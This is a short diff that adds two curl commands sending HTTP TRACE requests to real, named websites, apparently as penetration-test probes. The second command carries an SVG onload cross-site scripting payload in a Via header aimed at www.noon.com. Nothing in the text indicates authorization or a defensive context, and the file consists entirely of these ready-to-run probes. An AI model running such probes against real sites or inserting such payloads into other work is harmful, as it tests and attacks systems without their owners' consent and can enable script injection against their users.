@@ -1,0 +1,3 @@
+curl -X TRACE -H "X-Header: test/pentest" observatory.orionlabs.io
+
+curl -X TRACE -H "Via: <svg/onload=alert('test')>" https://www.noon.com
